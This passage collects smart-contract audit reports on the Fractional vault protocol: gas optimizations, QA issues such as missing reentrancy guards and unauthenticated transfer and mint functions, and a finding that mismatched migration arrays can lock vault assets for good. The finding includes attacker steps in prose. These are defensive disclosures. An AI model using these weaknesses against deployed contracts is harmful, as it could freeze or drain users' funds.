`x >> 1`. The `MUL` and `DIV` opcodes cost 5 gas, whereas `SHL` and `SHR` only cost 3 gas  _There are **3** instances of this issue:_    ```solidity File: /src/utils/MerkleBase.sol  100:   _node = _node / 2;  136:   result = new bytes32[](length / 2 + 1);    142:   result = new bytes32[](length / 2); ```                                                                  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L100  ### `REQUIRE()`/`REVERT()` STRINGS LONGER THAN 32 BYTES COST EXTRA GAS    _There are **2** instances of this issue:_    ```solidity File: /src/utils/MerkleBase.sol  62:    require(_data.length > 1, "wont generate root for single leaf");  78:    require(_data.length > 1, "wont generate proof for single leaf"); ```                               Use shorter error string message.    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L62    ### USE CUSTOM ERRORS RATHER THAN REVERT()/REQUIRE() STRINGS Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) while providing the same amount of information  _There are **5** instances of this issue:_    ```solidity File: /src/FERC1155.sol  263:   require( 264:       msg.sender == _from || 265:           isApprovedForAll[_from][msg.sender] || 266:           isApproved[_from][msg.sender][_id], 267:       "NOT_AUTHORIZED" 268:   );     275:   require( 276:       _to.code.length == 0 277:           ? _to != address(0) 278:           : INFTReceiver(_to).onERC1155Received( 279:               msg.sender, 280:               _from, 281:               _id, 282:               _amount, 283:               _data 284:           ) == INFTReceiver.onERC1155Received.selector, 285:       "UNSAFE_RECIPIENT" 286:   );      297:   require(metadata[_id] != address(0), "NO METADATA"); ```                               https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L263    ```solidity File: /src/utils/MerkleBase.sol  62:    require(_data.length > 1, "wont generate root for single leaf");  78:    require(_data.length > 1, "wont generate proof for single leaf"); ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L62  ### `INTERNAL` and `PRIVATE` FUNCTIONS ONLY CALLED ONCE CAN BE INLINED TO SAVE GAS Not inlining costs 20 to 40 gas because of two extra `JUMP` instructions and additional stack operations needed for function calls.    _There are **4** instances of this issue:_    ```solidity File: /src/Vault.sol    142:   function _revertedWithReason(bytes memory _response) internal pure { ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L137    ```solidity File: /src/utils/Multicall.sol    39:    function _revertedWithReason(bytes memory _response) internal pure { ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Multicall.sol#L25    ```solidity File: /src/utils/Multicall.sol    324:   function _computePermitStructHash(    350:   function _computePermitAllStructHash( ```    https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Multicall.sol#L113 https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/Multicall.sol#L159  ### USING `PRIVATE`/`INTERNAL` RATHER THAN `PUBLIC` FOR `CONSTANT`S SAVES GAS If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table      _There are **6** instances of this issue:_  ```solidity File: /src/FERC1155.sol    15:    string public constant NAME = "FERC1155";    17:    string public constant VERSION = "1"; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#324  ```solidity File: /src/modules/Buyout.sol    35:    uint256 public constant PROPOSAL_PERIOD = 2 days;    37:    uint256 public constant REJECTION_PERIOD = 4 days; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L35  ```solidity File: /src/modules/Migration.sol    43:    uint256 public constant PROPOSAL_PERIOD = 7 days; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L43  ```solidity File: /src/utils/SafeSend.sol    11:    address payable public constant WETH_ADDRESS = 12:        payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/SafeSend.sol#L11-L12     ### USE LITERAL ARRAYS INSTEAD OF CREATING AN ARRAY WITH SINGLE ITEM    _There are **2** instances of this issue:_    ```solidity File: /src/modules/Minter.sol    - 24:    function getLeafNodes() external view returns (bytes32[] memory nodes) { - 25:        nodes = new bytes32[](1); - 26:        nodes[0] = keccak256(abi.encode(getPermissions()[0])); - 27:    }    + 24:    function getLeafNodes() external view returns (bytes32[] memory) { + 25:        return [keccak256(abi.encode(getPermissions()[0]))]; + 26:    } ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Minter.sol#L25    ```solidity File: /src/modules/Minter.sol  - 32:    function getPermissions() - 33:        public - 34:        view - 35:        returns (Permission[] memory permissions) - 36:    { - 37:        permissions = new Permission[](1); - 38:        permissions[0] = Permission( - 39:            address(this), - 40:            supply, - 41:            ISupply.mint.selector - 42:        ); - 43:    }    + 32:    function getPermissions() public view returns (Permission[] memory) { + 33:        return [Permission(address(this), supply, ISupply.mint.selector)]; + 34:    } ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Minter.sol#L37  ### PREFIX INCREMENTS ARE CHEAPER THAN POSTFIX INCREMENTS `++I` costs less gas than `I++`, especially when it's used in for-loops (`--I`/`I--` too). Saves 6 gas per instance    _There are **3** instances of this issue:_    ```solidity File: /src/Vault.sol    78:    for (uint256 i = 0; i < length; i++) {                                       104:   for (uint256 i = 0; i < length; i++) { ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L78    ```solidity File: /src/utils/MerkleBase.sol    188:   ceil++; ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/utils/MerkleBase.sol#L188  ### ++I/I++ SHOULD BE UNCHECKED{++I}/UNCHECKED{I++} WHEN IT IS NOT POSSIBLE FOR THEM TO OVERFLOW, AS IS THE CASE WHEN USED IN FOR- AND WHILE-LOOPS The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas **per loop**    _There are **2** instances of this issue:_    ```solidity File: /src/Vault.sol    78:    for (uint256 i = 0; i < length; i++) {                                        104:   for (uint256 i = 0; i < length; i++) { ```  https://github.com/code-423n4/2022-07-fractional/blob/main/src/Vault.sol#L78 
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73-L82 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72-L99 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L174   # Vulnerability details  ## Impact In `propose()` in Migration.sol, there is no check that the lengths of the `selectors` and `plugins` arrays are the same. This means that if a migration is successful, the `install()` function in Vault.sol could revert beacuse we access an array out of bounds. This prevents a new vault being created thereby permanently locking assets inside the vault.  ## Proof of Concept 1. user starts a new migration proposal where `selectors.length != plugins.length` 2. enough users join proposal and the buyout bid starts 3. buyout bid is successful and migration starts with `settleVault()` 4. a new vault is cloned with `create()` -> `registry.deployFor()` -> `vault.install(selectors, plugins)` 5. a. If `selectors.length > plugins.length` then we get an out of bounds error and transaction reverts     b. If `selectors.length < plugins.length` then the excess values in `plugins` is ignored which is tolerable 6. In scenario a., the migration fails and a new migration cannot start so assets in the vault are permanently locked  This may seem quite circumstantial as this problem only occurs if a user specifies `selectors` and `plugins` wrongly however it is very easy for an attacker to perform this maliciously with no cost on their behalf, it is highly unlikely that users will be able to spot a malicious migration.  ## Tools Used VS Code ## Recommended Mitigation Steps Consider adding a check in `propose()` to make sure that the lengths match i.e. ```solidity function propose(         address _vault,         address[] calldata _modules,         address[] calldata _plugins,         bytes4[] calldata _selectors,         uint256 _newFractionSupply,         uint256 _targetPrice     ) external {         // @Audit Make sure that selectors and plugins match         require(_selectors.length == _plugins.length, "Plugin lengths do not match");         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);         if (id == 0) revert NotVault(_vault);         // Reverts if buyout state is not inactive         (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);         State required = State.INACTIVE;         if (current != required) revert IBuyout.InvalidState(required, current);          // Initializes migration proposal info         Proposal storage proposal = migrationInfo[_vault][++nextId];         proposal.startTime = block.timestamp;         proposal.targetPrice = _targetPrice;         proposal.modules = _modules;         proposal.plugins = _plugins;         proposal.selectors = _selectors;         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply;     } ```  Additionally, I would suggest adding such a check in the `install()` function as this may prevent similiar problems if new modules are added  
- [Low](#low)     - [**1. Packages with vulnerabilities**](#1-packages-with-vulnerabilities)     - [**2. Outdated compiler**](#2-outdated-compiler)     - [**3. Unsafe ERC20 calls**](#3-unsafe-erc20-calls)     - [**4. Lack of ACK during owner change**](#4-lack-of-ack-during-owner-change)     - [**5. Lack of nonReentrant in Buyout and Migration**](#5-lack-of-nonreentrant-in-buyout-and-migration)     - [**6. Lock ether**](#6-lock-ether)     - [**7. Complex fallback**](#7-complex-fallback) - [Non-Critical](#non-critical)     - [**8. Outdated packages**](#8-outdated-packages)     - [**9. Lack of checks**](#9-lack-of-checks)     - [**10. Open TODO**](#10-open-todo)     - [**11. Use abstract for base contracts**](#11-use-abstract-for-base-contracts)     - [**12. install allows uninstall**](#12-install-allows-uninstall)     - [**13. Contracts with functions without auth that can produce economic losses**](#13-contracts-with-functions-without-auth-that-can-produce-economic-losses)     - [**14. Improve propose method design**](#14-improve-propose-method-design)  # Low  ## **1. Packages with vulnerabilities**  The project contains packages that urgently need to be updated because they contain important vulnerabilities.  `npm audit`:  ``` 54 vulnerabilities (11 moderate, 40 high, 3 critical) ```  ## **2. Outdated compiler**  The pragma version used is:  ``` pragma solidity 0.8.13; ```  But recently solidity released a new version with important Bugfixes:  - The first one is related to ABI-encoding nested arrays directly from calldata. You can find more information [here](https://blog.soliditylang.org/2022/05/17/calldata-reencode-size-check-bug/).  - The second bug is triggered in certain inheritance structures and can cause a memory pointer to be interpreted as a calldata pointer or vice-versa. We also have a dedicated blog [post](https://blog.soliditylang.org/2022/05/17/data-location-inheritance-bug/) about this bug.  Apart from these, there are several minor bug fixes and improvements.  The minimum required version should be [0.8.14](https://github.com/ethereum/solidity/releases/tag/v0.8.14)  ## **3. Unsafe ERC20 calls**  The following code doesn't check the result of the ERC20 calls. ERC20 standard specify that the token can return false if these calls fails, so it's mandatory to check the result of these ERC20 methods.  Reference:  - [EIP-20](https://eips.ethereum.org/EIPS/eip-20) > NOTES: The following specifications use syntax from Solidity 0.4.17 (or above). Callers MUST handle false from returns (bool success). Callers MUST NOT assume that false is never returned!  Affected source code for `transfer`:  ```diff function ERC20Transfer(     address _token,     address _to,     uint256 _value ) external { -   IERC20(_token).transfer(_to, _value); +   require(IERC20(_token).transfer(_to, _value)); } ```  - [TransferReference.sol#L22](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/TransferReference.sol#L22) - [SafeSend.sol#L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/SafeSend.sol#L33)  Affected source code for `transferFrom`:  - [BaseVault.sol#L65](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L65)  ## **4. Lack of ACK during owner change**  It's possible to lose the ownership under specific circumstances.  Because an human error it's possible to set a new invalid owner. When you want to change the owner's address it's better to propose a new owner, and then accept this ownership with the new wallet.  Affected source code:  - [Vault.sol#L93](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) - [FERC1155.sol#L234](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L234)  ## **5. Lack of `nonReentrant` in `Buyout` and `Migration`**  **ERC1155** tokens incorporate the ability to react to a transfer using the `onERC1155Received` method on the receiver. And in the `Buyout` contract there is an alteration of the states after the call to `safeTransferFrom`, so a reentry is possible.  ```javascript IERC1155(token).safeTransferFrom(     address(this),     msg.sender,     id,     _amount,     "" ); // Updates ether balance of pool buyoutInfo[_vault].ethBalance += msg.value; ```   In the `end` method, you play with fire by sending ether after the transfer, saving the reentrancy by deleting the `buyoutInfo[_vault];`  > *Safe Transfer Rules* > To be more explicit about how the standard safeTransferFrom and safeBatchTransferFrom functions MUST operate with respect to the ERC1155TokenReceiver hook functions, a list of scenarios and rules follows.  The definition of the `burn` method of an **ERC1155** is as follows:  > A contract **MAY** skip calling the ERC1155TokenReceiver hook function(s) if the mint operation is transferring the token(s) to itself. In all other cases the ERC1155TokenReceiver rules MUST be followed as appropriate for the implementation (i.e. safe, custom and/or hybrid).  Reference:  - https://eips.ethereum.org/EIPS/eip-1155#erc-1155-token-receiver  So some implementations that follow the standard of an **ERC1155** could also trigger a reentrancy.  In the case of the `settleFractions` method of the `Migration` contract, **reentrancy is possible since the `fractionsMigrated` flag is set after minting**, which would allow the contract to be minted multiple times, however the receiver of the `ERC1155TokenReceiver` event is ` address(this)` and is considered non-exploitable.  Under all these premises, I consider that the `nonReentrant` modifier is needed in the following methods:  - [Buyout.sol#L168-L176](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L168-L176) - [Buyout.sol#L226-L235](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L226-L235) - [Buyout.sol#L221](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L221) - [Buyout.sol#L264-L270](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L264-L270) - [Migration.sol#L164-L172](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L164-L172) - [Migration.sol#L279](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L279) - [Migration.sol#L312-L325](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L312-L325)  ## **6. Lock ether**  If someone sends ether to the `Buyout` contract without using the buy/sell methods, via the `receive` method, they will be blocked forever. A similar behavior occurs in the `Migration` contract.  Affected source code:  - [Buyout.sol#L53](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53) - [Migration.sol#L63](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L63)  ## **7. Complex `fallback`**  The fallback method iss too complex and can be denied in certain cases.  According to the `fallback` solidity (documentation](https://docs.soliditylang.org/en/develop/contracts.html#fallback-function)  > In the worst case, if a payable fallback function is also used in place of a receive function, it can only rely on 2300 gas being available (see [receive Ether function](https://docs.soliditylang.org/en/develop/contracts.html#receive-ether-function) for a brief description of the implications of this).  > In the worst case, the receive function can only rely on 2300 gas being available (for example when send or transfer is used), leaving little room to perform other operations except basic logging. The following operations will consume more gas than the 2300 gas stipend: > - Writing to storage > - Creating a contract > - Calling an external function which consumes a large amount of gas > - Sending Ether  Reference:  - https://docs.soliditylang.org/en/develop/contracts.html#fallback-function  Affected source code:  - https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L38  ----  # Non-Critical  ## **8. Outdated packages**  Some used packages are out of date, it is good practice to use the latest version of these packages:  `"@openzeppelin/contracts": "^4.6.0"`   last `4.7.0`  ## **9. Lack of checks**  Check for `address(0)` during `constructor`, otherwise it could lead to bad initialization, bad implementations, or bad admin changes.  Affected source code for `address(0)`:  - [Supply.sol#L17](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L17) - [Metadata.sol#L17](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L17) - [Minter.sol#L18](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L18) - [BaseVault.sol#L25](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L25) - [Buyout.sol#L47-L49](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L47-L49) - [Migration.sol#L58-L59](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L58-L59)  Royalty `_percentage` must be less than 100, otherwise it could result in a Denial of Service in [royaltyInfo](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L247): - [FERC1155.sol#L223](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L223)  ## **10. Open TODO**  The code that contains "open todos" reflects that the development is not finished and that the code can change a posteriori, prior release, with or without audit.  Affected source code:  - [MerkleBase.sol#L24](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L24)  ## **11. Use `abstract` for base contracts**  Abstract contracts are contracts that have at least one function without its implementation. **An instance of an abstract cannot be created.**  Reference:  - https://docs.soliditylang.org/en/v0.6.2/contracts.html#abstract-contracts  Affected source code:  - [Minter.sol#L12](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L12)  ## **12. `install` allows `uninstall`**  It is possible to use the method `install` for `uninstall`, and the emmited event will be different. Being able to affect the correct functioning of the dApps that consume it. You only need to specify an `address(0)` as plugin during `install`.  Affected source code:  - [Vault.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73)  ## **13. Contracts with functions without auth that can produce economic losses**  The `BaseVault`, `Transfer` or `TransferReference` contracts allows an attacker to steal all the tokens to the implementation it has without having any type of auth, although it is not expected to have tokens, and trying to call with a delegate call is a risk that must be known.  ```javascript function ERC20Transfer(     address _token,     address _to,     uint256 _value ) external {    IERC20(_token).transfer(_to, _value); } ```  Affected source code:  - [Transfer.sol#L13](https://github.com/code-423n4/2022-07-fractional/blob/main/src/targets/Transfer.sol#L13) - [TransferReference.sol#L17-L69](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/TransferReference.sol#L17-L69) - [BaseVault.sol#L53-L117](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L53-L117)  The same thing happens in the `Supply` contract with `mint` and `burn`:  ```javascript /// @notice Mints fractional tokens /// @param _to Target address /// @param _value Transfer amount function mint(address _to, uint256 _value) external {     IVaultRegistry(registry).mint(_to, _value); }  /// @notice Burns fractional tokens /// @param _from Source address /// @param _value Burn amount function burn(address _from, uint256 _value) external {     IVaultRegistry(registry).burn(_from, _value); } ```  Affected source code:  - [Supply.sol#L11](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L11) - [SupplyReference.sol#L22-L31](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/SupplyReference.sol#L22-L31)  ## **14. Improve `propose` method design**  The `propose` method of `Migration` contract should return the `proposalId` in order to avoid human errors like the one mentioned in the *"User may lose ether due to incorrect `proposalId`*.  Affected source code:  - [Migration.sol#L72](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72) 
- [Gas](#gas)     - [**1. constants expressions are expressions, not constants**](#1-constants-expressions-are-expressions-not-constants)     - [**2. Reorder structure layout**](#2-reorder-structure-layout)     - [**3. Use calldata instead of memory**](#3-use-calldata-instead-of-memory)     - [**4. There's no need to set default values for variables**](#4-theres-no-need-to-set-default-values-for-variables)     - [**5. Don't use the length of an array for loops condition**](#5-dont-use-the-length-of-an-array-for-loops-condition)     - [**6. ++i costs less gas compared to i++ or i += 1**](#6-i-costs-less-gas-compared-to-i-or-i--1)     - [**7. Reduce the size of error messages Long revert Strings**](#7-reduce-the-size-of-error-messages-long-revert-strings)         - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)     - [**8. Use library instead of abstract contract**](#8-use-library-instead-of-abstract-contract)     - [**9. Use inline methods**](#9-use-inline-methods)     - [**10. Gas saving using immutable**](#10-gas-saving-using-immutable)     - [**11. Improved migrateFractions logic**](#11-improved-migratefractions-logic)  -----  # Gas  ## **1. `constants` expressions are expressions, not `constants`**  Due to how constant variables are implemented (replacements at compile-time), an expression assigned to a constant variable is recomputed each time that the variable is used, which wastes some gas.  If the variable was immutable instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.  Reference:  - https://github.com/ethereum/solidity/issues/9232  Consequences: each usage of a "constant" costs ~100gas more on each access (it is still a little better than storing the result in storage, but not much..). since these are not real constants, they can't be referenced from a real constant environment (e.g. from assembly, or from another library )  Affected source code:  - [Permit.sol#L5-L17](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Permit.sol#L5-L17)  ## **2. Reorder structure layout**  The following structs could be optimized moving the position of certains values in order to save slot storages:  Put booleans types together on [IMigration.sol#L8-L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IMigration.sol#L8-L33)  ```diff struct Proposal {     // Start time of the migration proposal     uint256 startTime;     // Target buyout price for the migration     uint256 targetPrice;     // Total ether contributed to the migration     uint256 totalEth;     // Total fractions contributed to the migration     uint256 totalFractions;     // Module contract addresses proposed for the migration     address[] modules;     // Plugin contract addresses proposed for the migration     address[] plugins;     // Function selectors for the proposed plugins     bytes4[] selectors; +   // Old fraction supply for a given vault +   uint256 oldFractionSupply; +   // New fraction supply for a given vault that has succesfully migrated +   uint256 newFractionSupply;     // Address for the new vault to migrate to (if buyout is succesful)     address newVault;     // Boolean status to check if the propoal is active     bool isCommited; -   // Old fraction supply for a given vault -   uint256 oldFractionSupply; -   // New fraction supply for a given vault that has succesfully migrated -   uint256 newFractionSupply;     // Boolean status to check that the fractions have already been migrated     bool fractionsMigrated; } ```  ## **3. Use `calldata` instead of `memory`**  The following methods are `external` but `memory` is used for arguments.  - [IMigration.sol#L89-L162](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IMigration.sol#L89-L162) - [IModule.sol#L8-L13](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IModule.sol#L8-L13) - [IVault.sol#L43-L64](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IVault.sol#L43-L64) - [IVaultRegistry.sol#L43-L71](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IVaultRegistry.sol#L43-L71)   These one require to change the visibility to `external`:  - [MerkleBase.sol#L61](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L61) - [MerkleBase.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L73)  ## **4. There's no need to set default values for variables**  If a variable is not set/initialized, the default value is assumed (0, `false`, 0x0 ... depending on the data type). You are simply wasting gas if you directly initialize it with its default value.  Affected source code:  - [MerkleBase.sol#L51](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L51) - [BaseVault.sol#L64](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L64) - [BaseVault.sol#L83](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L83) - [BaseVault.sol#L107](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L107) - [Vault.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L78) - [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L104)  ## **5. Don't use the length of an array for loops condition**  It's cheaper to store the length of the array inside a local variable and iterate over it.  Affected source code:  - [MerkleBase.sol#L51](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L51) - [MerkleBase.sol#L110](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L110) - [BaseVault.sol#L64](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L64) - [BaseVault.sol#L83](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L83) - [BaseVault.sol#L107](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L107) - [BaseVault.sol#L130-L132](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L130-L132) - [Buyout.sol#L454](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L454)  ## **6. `++i` costs less gas compared to `i++` or `i += 1`**  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means:  ```solidity uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ```solidity uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2` I suggest using `++i` instead of `i++` to increment the value of an uint variable. Same thing for `--i` and `i--`  Affected source code:  - [Vault.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L78) - [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L104)  ## **7. Reduce the size of error messages (Long revert Strings)**  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  I suggest shortening the revert strings to fit in 32 bytes, or that using custom errors as described next (require pragma upgrade).  ### Use Custom Errors instead of Revert Strings to save Gas  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  Source Custom Errors in Solidity:  Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert("Insufficient funds.");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  Affected source code:  - [MerkleBase.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62) - [MerkleBase.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78)  ## **8. Use `library` instead of `abstract` contract**  If the following contracts were libraries, they could save gas thanks to compiler optimizations since there are functions that are not called and being an abstract contract implies publishing all the code marked as public, such as library, the compiler can choose which functions to eliminate by not be used.  Smaller contracts would be produced, with less inheritance and therefore more auditable and readable.  Affected source code:  - [MerkleBase.sol](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L7)  ## **9. Use inline methods**  The following methods can be moved to inline calls without greatly affecting readability, this will increase the performance of the contract.  Affected source code:  - [Multicall.sol#L39](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Multicall.sol#L39)  ## **10. Gas saving using `immutable`**  It's possible to avoid storage access a save gas using `immutable` keyword for the following variables:  It's also better to remove the initial values, because they will be set during the constructor.  Affected source code:  - [BaseVault.sol#L19](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L19) - [Minter.sol#L14](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L14) - 